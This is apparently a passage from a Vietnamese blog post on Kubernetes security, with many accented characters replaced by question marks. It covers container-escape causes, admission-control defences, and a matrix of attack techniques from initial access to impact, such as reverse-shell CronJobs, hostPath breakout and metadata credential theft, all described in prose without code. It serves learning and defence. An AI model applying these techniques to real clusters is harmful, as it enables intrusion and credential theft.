Ngoài ra, ? c?p cluster nên dùng admission control d? ch?n các workload nguy hi?m, ví d?:

- Không cho phép privileged: true.
- Không cho phép container ch?y b?ng root n?u không có lý do rõ ràng.
- Không cho phép mount hostPath tùy ti?n.
- Không cho phép thêm capability nguy hi?m.
- B?t bu?c dùng seccomp profile.
- B?t bu?c AppArmor ho?c SELinux policy n?u môi tru?ng h? tr?.
- Gi?i h?n quy?n c?a service account theo nguyên t?c least privilege.

M?t di?m c?n nh? là trong Kubernetes, **pod thu?ng là trust boundary**, không ph?i t?ng container riêng l?. Các container trong cùng m?t pod có th? chia s? network namespace, volume, và m?t s? tài nguyên khác. Vì v?y n?u m?t container trong pod b? compromise, các container còn l?i trong cùng pod cung nên du?c xem là có nguy co b? ?nh hu?ng.

Container breakout cung có th? di theo hu?ng không tr?c ti?p phá kernel, mà pivot sang các thành ph?n khác:

- Ð?c service account token r?i g?i Kubernetes API.
- Dò các service n?i b? trong cluster.
- Truy c?p cloud metadata service d? l?y temporary credential.
- Tìm secret trong environment variable ho?c config file.
- T?n công kubelet API n?u node expose sai.
- L?m d?ng workload identity d? truy c?p cloud resources.

Ði?u này cho th?y breakout không ch? là “thoát kh?i container ra host”, mà còn là b?t k? cách nào phá v? gi? d?nh isolation ban d?u c?a operator. N?u workload ch? dáng l? du?c phép ch?y app, nhung attacker dùng nó d? d?c Secret, di?u khi?n API server, ho?c truy c?p cloud account, thì v? m?t r?i ro nó v?n là m?t d?ng isolation failure nghiêm tr?ng.

Tóm l?i, container escape thu?ng d?n t? ba nhóm nguyên nhân chính:

1. **L? h?ng k? thu?t**  
    Kernel bug, container runtime CVE, filesystem bug, network stack bug.
    
2. **C?u hình sai**  
    Privileged container, root user, hostPath mount, capability du th?a, thi?u seccomp/AppArmor/SELinux.
    
3. **Pivot qua credential ho?c control plane**  
    Service account token, kubeconfig, cloud metadata, workload identity, Kubernetes API, kubelet API.


### Phòng th? cho badpods

Trong Kubernetes, RBAC ch? ki?m tra m?t identity có du?c phép t?o Pod hay không. Tuy nhiên, RBAC không d? d? dánh giá Pod dó có an toàn hay không. Vì v?y Kubernetes c?n thêm l?p Admission Controller d? ki?m tra n?i dung Pod tru?c khi cho phép t?o.

Các co ch? nhu Pod Security Admission, Kyverno ho?c OPA Gatekeeper có th? ch?n nh?ng c?u hình nguy hi?m nhu `privileged: true`, `hostPID`, `hostNetwork` ho?c `hostPath`. Ðây là l?p phòng th? quan tr?ng d? ngan attacker bi?n quy?n `create pods` thành kh? nang truy c?p Node.

Tóm l?i, d? gi?m r?i ro Pod escape, c?n k?t h?p hai l?p ki?m soát: RBAC gi?i h?n ai du?c t?o Pod, và Admission Policy gi?i h?n Pod du?c phép ch?a c?u hình gì.



Ðây là so d? t?n công mà mình ki?m du?c trên m?ng khi b?n có th? ti?p c?n cluster t? các hu?ng khác nhau 

![](/assets/images/posts/Pasted%20image%2020260524172250.png)

Nó cho th?y attacker có th? ti?p c?n cluster t? nhi?u hu?ng khác nhau:

- **Access API server**: attacker ho?c user có credential có th? g?i tr?c ti?p Kubernetes API server.
- **Misconfigured Kubernetes dashboard**: dashboard c?u hình sai có th? cho phép truy c?p cluster qua UI.
- **Malicious container image in registry**: image d?c h?i du?c push lên container registry, sau dó du?c deploy vào cluster.
- **Vulnerable application**: app ch?y trong pod có l? h?ng, attacker khai thác app r?i pivot vào pod/cluster.
- **Misconfigured Docker daemon**: Docker daemon expose sai c?u hình, attacker có th? di?u khi?n container/node.
- **Developer/DevOps**: tài kho?n ho?c máy c?a developer/devops b? compromise, t? dó ?nh hu?ng registry ho?c cluster.

Bên trong hình có 2 vùng chính:

**Master / control plane**  
Bên trái là thành ph?n di?u khi?n Kubernetes:

- API server: c?ng trung tâm d? m?i th? giao ti?p v?i cluster.
- etcd: noi luu state/secret/config c?a cluster.
- Scheduler: quy?t d?nh pod ch?y ? node nào.
- controller manager: di?u ph?i tr?ng thái cluster.
- K8s dashboard: giao di?n web qu?n tr? cluster n?u có cài.

**Node / worker node**  
Bên ph?i là máy ch?y workload:

- kubelet: agent trên node, nh?n l?nh t? API server d? ch?y pod.
- kube-proxy: x? lý networking/service routing.
- Pod: noi container/app ch?y.
- API: có th? là app API bên trong pod.

Các nhãn nhu **Peirates**, **kube-hunter**, **BOB**, **Deepce** là công c? b?o m?t/offensive Kubernetes/container thu?ng dùng d? ki?m tra ho?c khai thác c?u hình y?u:

- kube-hunter: scanner tìm l? h?ng/c?u hình y?u trong Kubernetes.
- Peirates: công c? h? tr? privilege escalation và discovery trong Kubernetes.
- BOB, Deepce: công c? liên quan d?n container/Kubernetes enumeration ho?c escape-checking.

**Kubernetes có nhi?u di?m vào**, không ch? m?i API server. Attacker có th? di t? app l?i, dashboard c?u hình sai, image d?c, Docker daemon expose, registry, developer account, ho?c credential b? l?. Khi dã vào du?c m?t pod ho?c node, h? có th? ti?p t?c enumerate, pivot, leo thang quy?n, ho?c tác d?ng d?n control plane n?u c?u hình cluster y?u.

![](/assets/images/posts/Pasted%20image%2020260524175900.png)

Ho?c là ki thu?t reverse shell trong 1 container b? compromise


![](/assets/images/posts/Pasted%20image%2020260524180647.png)


### Attack surface cho K8s

![](/assets/images/posts/Pasted%20image%2020260524211855.png)



|Initial access (popping a shell pt 1 - prep)|Execution (popping a shell pt 2 - exec)|Persistence (keeping the shell)|Privilege escalation (container breakout)|Defense evasion (assuming no IDS)|Credential access (juicy creds)|Discovery (enumerate possible pivots)|Lateral movement (pivot)|Command & control (C2 methods)|Impact (dangers)|
|---|---|---|---|---|---|---|---|---|---|
|Using cloud credentials: service account keys, impersonation|Exec into container (bypass admission control policy)|Backdoor container (add a reverse shell to local or container registry image)|Privileged container (legitimate escalation to host)|Clear container logs (covering tracks after host breakout)|List K8s Secrets|List K8s API server (nmap, curl)|Access cloud resources (workload identity and cloud integrations)|Dynamic resolution (DNS tunneling)|Data destruction (datastores, files, NAS, ransomware…)|
|Compromised images in registry (supply chain unpatched or malicious)|BASH/CMD inside container (implant or trojan, RCE/reverse shell, malware, C2, DNS tunneling)|Writable host path mount (host mount breakout)|Cluster admin role binding (untested RBAC)|Delete K8s events (covering tracks after host breakout)|Mount service principal (Azure specific)|Access `kubelet` API|Container service account (API server)|App protocols (L7 protocols, TLS, …)|Resource hijacking (cryptojacking, malware C2/distribution, open relays, botnet membership)|
|Application vulnerability (supply chain unpatched or malicious)|Start new container (with malicious payload: persistence, enumeration, observation, escalation)|K8s CronJob (reverse shell on a timer)|Access cloud resources (metadata attack via workload identity)|Connect from proxy server (to cover source IP, external to cluster)|Applications credentials in config files (key material)|Access K8s dashboard (UI requires service account credentials)|Cluster internal networking (attack neighboring pods or systems)|Botnet (k3d, or traditional)|Application DoS|
|kubeconfig file (exfiltrated, or uploaded to the wrong place)|Application exploit (RCE)|Static pods (reverse shell, shadow API server to read audit-log-only headers)|Pod `hostPath` mount (logs to container breakout)|Pod/container name similarity (visual evasion, CronJob attack)|Access container service account (RBAC lateral jumps)|Network mapping (nmap, curl)|Access container service account (RBAC lateral jumps)||Node scheduling DoS|
|Compromise user endpoint (2FA and federating auth mitigate)|SSH server inside container (bad practice)|Injected sidecar containers (malicious mutating webhook)|Node to cluster escalation (stolen credentials, node label rebinding attack)|Dynamic resolution (DNS) (DNS tunneling/exfiltration)|Compromise admission controllers|Instance metadata API (workload identity)|Host writable volume mounts||Service discovery DoS|
|K8s API server vulnerability (needs CVE and unpatched API server)|Container lifecycle hooks (`postStart` and `preStop` events in pod YAML)|Rewrite container lifecycle hooks (`postStart` and `preStop` events in pod YAML)|Control plane to cloud escalation (keys in Secrets, cloud or control plane credentials)|Shadow admission control or API server||Compromise K8s Operator (sensitive RBAC)|Access K8s dashboard||PII or IP exfiltration (cluster or cloud datastores, local accounts)|
|Compromised host (credentials leak/stuffing, unpatched services, supply chain compromise)||Rewrite liveness probes (exec into and reverse shell in container)|Compromise admission controller (reconfigure and bypass to allow blocked image with flag)|||Access host filesystem (host mounts)|Access tiller endpoint (Helm v3 negates this)||Container pull rate limit DoS (container registry)|
|Compromised `etcd` (missing auth)||Shadow admission control or API server (privileged RBAC, reverse shell)|Compromise K8s Operator (compromise flux and read any Secrets)||||Access K8s Operator||SOC/SIEM DoS (event/audit/log rate limit)|
|||K3d botnet (secondary cluster running on compromised nodes)|Container breakout (kernel or runtime vulnerability e.g., DirtyCOW, `/proc/self/exe`, eBPF verifier bugs, Netfilter)||

Ðo?n này là m?t b?ng attack chain cho môi tru?ng **container / Kubernetes / cloud**. M?i c?t là m?t giai do?n trong vòng d?i t?n công, còn m?i dòng là ví d? k? thu?t mà attacker có th? dùng ? giai do?n dó.

Nói ng?n g?n: nó mô t? attacker di t? **có quy?n ban d?u**, ch?y l?nh trong container, gi? quy?n truy c?p, leo thang ra host ho?c cluster, né phát hi?n, l?y credential, dò h? th?ng, pivot sang noi khác, thi?t l?p C2, r?i gây tác d?ng.

**Các c?t nghia là gì**

Initial access  
Cách attacker vào du?c h? th?ng ban d?u. Ví d?: l? cloud credential, kubeconfig b? leak, app có RCE, image trong registry b? cài mã d?c, endpoint ngu?i dùng b? compromise.

Execution  
Sau khi vào du?c, attacker ch?y code/l?nh. Ví d?: exec vào container, ch?y bash/cmd, t?o container m?i ch?a payload, khai thác app d? RCE.

Persistence  
Gi? quy?n truy c?p lâu dài. Ví d?: backdoor image, CronJob ch?y reverse shell theo l?ch, static pod, SSH server trong container, lifecycle hook d?c h?i.

Privilege escalation  
Leo thang quy?n. Trong Kubernetes thu?ng là t? pod/container lên node, t? node lên cluster, ho?c t? cluster lên cloud. Ví d?: privileged container, writable hostPath mount, kubelet API, RBAC quá r?ng, container breakout qua kernel/runtime bug.

Defense evasion  
Né phát hi?n. Ví d?: xóa container logs, xóa Kubernetes events, dùng tên pod/container gi?ng workload h?p pháp, shadow API server/admission controller, bypass admission policy.

Credential access  
Tìm và l?y credential. Ví d?: list K8s Secrets, d?c service account token, cloud service principal, workload identity token, kubeconfig, credential trong config file, etcd không b?o v?.

Discovery  
Dò h? th?ng d? tìm pivot. Ví d?: list Kubernetes API server, nmap/curl m?ng n?i b? cluster, truy c?p dashboard, kubelet API, operator, service discovery, cloud metadata.

Lateral movement  
Di chuy?n ngang sang pod/node/service/cloud khác. Ví d?: dùng service account d? g?i API server, workload identity d? vào cloud resources, attack neighboring pods, truy c?p dashboard/operator/tiller.

Command & control  
Kênh di?u khi?n t? xa. Ví d?: DNS tunneling, proxy server d? che IP ngu?n, app protocol nhu HTTPS/TLS, botnet, malware C2.

Impact  
H?u qu? cu?i cùng. Ví d?: xóa d? li?u, ransomware, cryptojacking, DoS app/node/service discovery/SIEM, exfiltration PII/IP, botnet, phá container registry.

**M?t vài ví d? d? hi?u**

Using cloud credentials: service account keys, impersonation  
N?u attacker có key cloud ho?c quy?n impersonate service account, h? có th? vào cloud project/subscription tru?c, r?i t? dó tìm cluster ho?c workload liên quan.

Exec into container  
Attacker có quy?n ho?c l? h?ng cho phép m? shell bên trong container. Ðây là bu?c “dã vào du?c workload”.

Privileged container  
Container ch?y v?i quy?n quá cao, có th? truy c?p thi?t b?/kernel capability c?a host. Ðây là r?i ro l?n vì có th? d?n t?i host compromise.

Writable host path mount / Host writable volume mounts  
Pod mount thu m?c t? host và có quy?n ghi. N?u mount nh?y c?m, attacker có th? s?a file trên node ho?c d?t persistence.

List K8s Secrets  
N?u RBAC cho phép d?c Secret, attacker có th? l?y token, database password, cloud key, TLS key.

Instance metadata API  
Pod g?i metadata service c?a cloud d? l?y token t?m th?i. N?u workload identity/metadata protection c?u hình sai, attacker có th? dùng token dó truy c?p cloud resources.

K8s CronJob reverse shell on a timer  
M?t cách persistence: t?o CronJob d?nh k? g?i v? attacker. V? phòng th?, nên audit CronJob l? và RBAC t?o workload.

Shadow admission control or API server  
Attacker d?ng thành ph?n gi? ho?c d?c h?i d? dánh l?a/ghi nh?n thông tin nh?y c?m ho?c bypass chính sách.

SOC/SIEM DoS  
T?o quá nhi?u log/event/audit d? làm ngh?n h? th?ng giám sát, khi?n c?nh báo th?t khó th?y hon.

**Ý chính c?a toàn b? b?ng**

Ðây không ph?i là m?t checklist “làm theo d? hack”, mà là b?n d? r?i ro d? defender/red team hi?u:

- Ðu?ng vào có th? d?n t? app, image, kubeconfig, cloud key, ngu?i dùng, registry.
- Container không ph?i biên gi?i b?o m?t tuy?t d?i.
- RBAC, Secrets, service account và workload identity là vùng c?c k? nh?y c?m.
- hostPath, privileged pod, kubelet API, metadata API là các di?m breakout/pivot ph? bi?n.
- Persistence trong Kubernetes thu?ng ?n trong CronJob, static pod, lifecycle hook, webhook, operator.
- Impact không ch? là m?t d? li?u, mà còn cryptojacking, botnet, DoS, supply chain compromise.

Hi?n t?i tui m?i nghiên c?u t?i dây thôi vì m?ng này cung khá là r?ng , s?p t?i tui s? d?ng lab và s? mô ph?ng các ki thu?t t?n công th?c t? hon. C?m on các b?n dã dành thu?i gian d?c.



